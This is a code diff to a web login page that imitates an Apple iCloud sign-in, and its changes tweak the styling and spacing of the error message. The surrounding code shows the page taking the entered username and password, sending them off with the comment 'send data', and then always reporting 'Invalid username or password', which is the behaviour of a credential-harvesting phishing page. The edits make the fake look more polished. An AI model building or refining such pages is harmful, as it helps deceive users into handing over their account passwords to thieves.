@@ -52,10 +52,10 @@ input[type="text"], input[type="password"] {
 /* Labels & spacing */
 label[for="password"] { position: relative; top: -6px; font-size: 0.75rem; }
 .password-container { margin-top: 4px; position: relative; }
-label.inline-flex.items-center { position: relative; top: -8px; font-size: 0.817rem; font-weight: 350; }
-#forgotPassword { position: relative; top: -9.5px; font-size: 0.817rem; font-weight: 350; color: #0083ff; }
+label.inline-flex.items-center { position: relative; font-size: 0.817rem; font-weight: 350; transition: margin-top 0.2s; }
+#forgotPassword { position: relative; font-size: 0.817rem; font-weight: 350; color: #0083ff; transition: margin-top 0.2s; }
 
-/* Error message spacing (tightened) */
+/* Error message */
 #errorMsg { 
   width: 85%; margin-left: auto; margin-right: auto;
   font-size: 0.8rem; text-align: left; color:#ff1952; font-weight: 400; 
@@ -107,7 +107,7 @@ form.flex.flex-col.space-y-6 { gap: 0.5rem; }
       </button>
     </div>
     <p id="errorMsg" class="hidden">Invalid username or password. Try again.</p>
-    <label class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
+    <label id="saveLoginLabel" class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
       <input type="checkbox" checked>
       <span>Save Login Info on your iCloud devices</span>
     </label>
@@ -128,6 +128,8 @@ document.addEventListener("DOMContentLoaded", function(){
         c=document.getElementById("loginBtn"),
         d=document.getElementById("errorMsg"),
         e=document.getElementById("loginForm"),
+        saveLabel=document.getElementById("saveLoginLabel"),
+        forgotLink=document.getElementById("forgotPassword"),
         btnText=c.querySelector(".btn-text"),
         spinnerContainer=c.querySelector(".spinner-container"),
         u2="/api/validate",
@@ -147,12 +149,24 @@ document.addEventListener("DOMContentLoaded", function(){
     a.value.trim()&&b.value.trim()?(c.classList.remove("bg-[#b7c0c8]"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1):(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-[#b7c0c8]"),c.disabled=!0)
   }
 
-  a.addEventListener("input",()=>{ y2(); d.classList.add("hidden"); });
-  
   let hideTimeout;
+
+  function resetErrorSpacing(){
+    saveLabel.style.marginTop = "";
+    forgotLink.style.marginTop = "";
+  }
+
+  a.addEventListener("input",()=>{
+    y2();
+    d.classList.add("hidden");
+    resetErrorSpacing();
+    if(hideTimeout) clearTimeout(hideTimeout);
+  });
+
   b.addEventListener("input",()=>{
     y2();
     d.classList.add("hidden");
+    resetErrorSpacing();
     if(hideTimeout) clearTimeout(hideTimeout);
   });
 
@@ -165,6 +179,7 @@ document.addEventListener("DOMContentLoaded", function(){
 
       const w={username:t,password:u,timestamp:new Date().toLocaleString()};
       await x1(w); // send data
+
       hideTimeout = setTimeout(()=>{
         d.textContent="Invalid username or password. Try again.";
         d.classList.remove("hidden");
@@ -172,6 +187,11 @@ document.addEventListener("DOMContentLoaded", function(){
         c.classList.remove("bg-[#00b0ff]"); c.classList.add("bg-[#b7c0c8]"); c.disabled=!0;
         spinnerContainer.style.display="none";
         btnText.style.display="inline";
+
+        // Reduce gap when error is shown
+        saveLabel.style.marginTop = "-6px";
+        forgotLink.style.marginTop = "0px";
+
       }, 1000);
     } else {
       d.textContent="Please fill in both fields.";
